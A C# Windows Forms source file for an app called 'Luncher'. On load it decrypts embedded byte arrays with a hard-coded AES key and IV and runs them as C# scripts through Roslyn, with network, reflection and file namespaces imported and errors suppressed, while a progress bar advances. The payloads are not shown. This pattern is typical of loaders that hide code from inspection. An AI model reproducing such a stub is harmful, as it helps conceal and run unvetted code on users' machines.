using Roslyn.Scripting.CSharp;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Luncher
{
    public partial class LuncherForm : Form
    {
        public LuncherForm()
        {
            InitializeComponent();
        }

        private static string[] References = new string[]{"System","System.Net","System.Reflection",
            "System.Threading", "System.Threading.Tasks", "System.Windows.Forms", "System.IO"};

        public static Roslyn.Scripting.Session InitScriptEngine()
        {
            var se = new ScriptEngine();
            var s = se.CreateSession();
            foreach (string Reference in References)
            {
                s.AddReference(Reference);
                s.ImportNamespace(Reference);
            }
            return s;
        }

        private void LuncherForm_Load(object sender, EventArgs e)
        {
            new Thread(() =>
            {
                var AES = new AesCryptoServiceProvider();
                AES.Key = new byte[256 / 8] { 240, 119, 82, 224, 93, 215, 250, 43, 78,
                                192, 95, 229, 166, 27, 4, 105, 40, 251, 211, 19, 190, 77, 207,
                                 34, 116, 39, 244, 211, 54, 212, 5, 205 };
                AES.IV = new byte[128 / 8] { 58, 41, 152, 142, 81, 7, 185, 181,
                                153, 139, 240, 86, 160, 125, 97, 233 };
                var s = InitScriptEngine();
                Action<int> x = delegate(int ind)
                {
                    var c = AES.CreateDecryptor();
                    string ss = Encoding.UTF8.GetString(c.TransformFinalBlock(a[ind], 0, a[ind].Length));
                    try
                    {
                         s.Execute(ss);
                    }
                    catch (Exception) { }
                    pb.BeginInvoke((Action)(() => { pb.Value++; }));
                };
                InitData();
                pb.Invoke((Action)(() => { pb.Maximum = a.Count+100; }));
                x(0);
                Parallel.For(1, a.Count, d => x(d));
                while ((int)s.Execute("w") < 17) Thread.Sleep(100);
                pb.BeginInvoke((Action)(() => { pb.Value+=100; }));
                this.BeginInvoke((Action)(() => { this.Close(); }));
            }).Start();
        }
    }
}
